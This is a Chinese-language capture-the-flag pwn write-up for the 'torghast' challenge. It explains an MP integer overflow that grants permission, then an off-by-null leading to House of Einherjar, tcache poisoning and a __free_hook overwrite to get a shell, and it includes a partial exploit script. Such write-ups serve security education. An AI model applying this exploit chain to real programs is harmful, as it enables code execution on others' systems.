# torghast

> 分类：Pwn

## 题目描述

House of Einherjar 利用。EditUser 存在 off-by-null，通过整数溢出获取权限，最终劫持 free_hook。

## 考察知识点

- House of Einherjar
- off-by-null
- 整数溢出（MP 多次减法）

## 解法

1. 首先通过多次对 User.MP 减法造成整数溢出，获取 Selected_Idx 控制权，从而可打印任意堆块。
2. 多次连续申请释放堆块填满 tcache 进入 unsortedbin，利用脏数据泄露 libcbase 和 heapbase。
3. 利用 off-by-null 构造 House of Einherjar，实现任意地址写。
4. 修改 `__free_hook` 为 `system`，释放堆块触发。

关键点：
- 整数溢出：`MP` 多次减 10/25/50 造成溢出，使 `MP > 0x5F5E0FE` 设置 `MasterFlag=1`。
- House of Einherjar：伪造 chunk 的 fd/bk 指向伪造堆块用户区域地址（2.29 后需泄露堆地址）。

```python
# 获取权限（整数溢出）
JoinGame()
JoinGame_Magic(2)
while True:
    JoinGame_Magic(1)
    data = p.recvuntil("1. Challange Torghast Tower!\n")
    if b"NO MORE MP" in data:
        break
JoinGame_Magic(4)
JoinGame_Challenge() * 3  # 获得 PermissionFlag

# House of Einherjar
PlayerManager_AddUser(10, 0x20, p64(0)+p64(0x61)+p64(heapbase+0xbe0)*2)  # fake chunk
PlayerManager_AddUser(11, 0x38, b'B')
PlayerManager_AddUser(12, 0xf0, b'B')
PlayerManager_AddUser(13, 0x30, b'B')  # 防合并
PlayerManager_EditUser(11, b'B'*0x30+p64(0x60))  # off-by-null
# ... 触发 house of Einherjar 造成 overlapping
PlayerManager_AddUser(14, 0x50, b'B'*0x10+p64(0)+p64(0x41)+p64(libc.sym['__free_hook']))  # tcache poisoning
PlayerManager_AddUser(15, 0x30, '/bin/sh\x00')
PlayerManager_AddUser(1, 0x30, p64(libc.sym['system']))
PlayerManager_DeleteUser(15)  # trigger
```

## 参考答案

（flag 通过 House of Einherjar + tcache poisoning 劫持 free_hook 后 getshell 读取）

## 来源

- 作者：sh0ve1 | https://sh0ve1.github.io/2022/05/16/2022%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9BPwn%E9%A2%98/
